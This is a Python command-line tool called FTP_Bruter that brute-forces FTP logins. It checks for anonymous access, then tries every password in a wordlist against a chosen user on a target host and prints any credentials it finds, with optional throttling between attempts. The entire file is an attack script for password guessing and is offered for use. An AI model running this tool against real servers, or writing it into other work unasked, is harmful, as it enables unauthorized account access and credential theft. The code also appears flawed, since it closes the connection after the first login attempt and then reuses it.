import ftplib
import argparse
import os
import colorama
import time
from sys import argv


banner = """


______   _____  ______    ______                  _                    ______                                              
|  ___| |_   _| | ___ \   | ___ \                | |                   |  ___|                                             
| |_      | |   | |_/ /   | |_/ /  _ __   _   _  | |_    ___   ______  | |_      ___    _ __    ___    ___                 
|  _|     | |   |  __/    | ___ \ | '__| | | | | | __|  / _ \ |______| |  _|    / _ \  | '__|  / __|  / _ \                
| |       | |   | |       | |_/ / | |    | |_| | | |_  |  __/          | |     | (_) | | |    | (__  |  __/                
\_|       \_/   \_|       \____/  |_|     \__,_|  \__|  \___|          \_|      \___/  |_|     \___|  \___|                
                                                                                                                           
                                                                                                                           
"""


def connect(host, port):
    try:
        ftp = ftplib.FTP()
        ftp.connect(host, port=port)
        return ftp
    except:
        print("[-] ERROR: Cannot connect to FTP server.\n")
        exit(1)


def login(ftp, user, password):
    try:
        ftp.login(user, password)
        ftp.quit()
        return True
    except:
        return False


def main():
    # init colorama for print in color
    colorama.init(autoreset=True)
    # Building arguments
    parser = argparse.ArgumentParser(description="FTP brute-force login",
                                     epilog="--------------------------------------------------------------------")
    main_group = parser.add_argument_group("arguments")
    main_group.add_argument("-address", metavar="<ADDRESS>", help="Target address as IP/host/domain", required=True)
    main_group.add_argument("-port", metavar="<PORT>", help="Target port (default = 21)", type=int, default=21)
    main_group.add_argument("-user", metavar="<USER>", help="User to brute-force", required=True)
    main_group.add_argument("-P", metavar="<PASSWORDS-FILE>", help=r"Passwords file to use", required=True)
    options_group = parser.add_argument_group("options")
    options_group.add_argument("-T", metavar="<SECONDS>", type=float, default=0,
                               help="Timeout between each request (default: none)")
    options_group.add_argument("-V", action="store_true", help="Verbose mode", required=False)
    options_group.add_argument("-KT", action="store_true", help="Keep trying at success", required=False)
    args = parser.parse_args()
    # store variables
    target = args.address
    port = args.port
    user = args.user
    password_file_path = args.P
    timeout = args.T
    verbose = args.V
    keeptry = args.KT
    # validate passwords file
    if not os.path.isfile(password_file_path):
        print(colorama.Fore.RED + "\n[-] Invalid file\n")
        return
    # print when starting script
    print("\n[*] FTP_Bruter starting...\n")
    # Connect to FTP Server
    ftp = connect(target, port)
    # try to connect with Anonymous login
    if login(ftp, "Anonymous", "password"):
        # FTP Anonymous succeeded - print and return
        print(colorama.Fore.GREEN + "[+] FTP Anonymous login succeeded on host {}\n".format(target))
        return
    # FTP Anonymous failed
    else:
        if verbose:
            print("[-] FTP Anonymous login failed on host {}\n".format(target))
        # open password file for read
        with open(password_file_path, 'r') as password_file:
            # count and total of lines for calculating percentage while bruting
            count = 0
            total = len(password_file.readlines())
            # go back to line 0
            password_file.seek(0)
            # iterate over passwords in file
            for line in password_file.readlines():
                # remove spaces
                password = line.strip()
                # sleep timeout before check
                time.sleep(timeout)
                # add count
                count += 1
                # try to connect with current password
                if login(ftp, user, password):
                    # FTP login succeeded with current password
                    print(colorama.Fore.GREEN + "[+] FTP login credentials found on host {}: [{}:{}]               \n".format(target, user, password))
                    if keeptry:
                        # if keeptry argument supplied continue to next password
                        continue
                    else:
                        # else return
                        return
                else:
                    # FTP login failed with current password
                    if verbose:
                        print("[-] ({}%) password incorrect: {}                         ".format(int(100 * (count / total)), password), end="\r\r\r")
                    # continue to next password
                    continue
        # end of file
        print(colorama.Fore.RED + "[*] FTP_Bruter finished. no password found.                      \n")
        return


if __name__ == "__main__":
    if "-h" in argv or "--help" in argv or len(argv) == 1:
        print(banner)
    try:
        # start script
        main()
    except KeyboardInterrupt:
        print(colorama.Fore.RED + "[*] script interrupted by user.                        \n")
        exit(0)

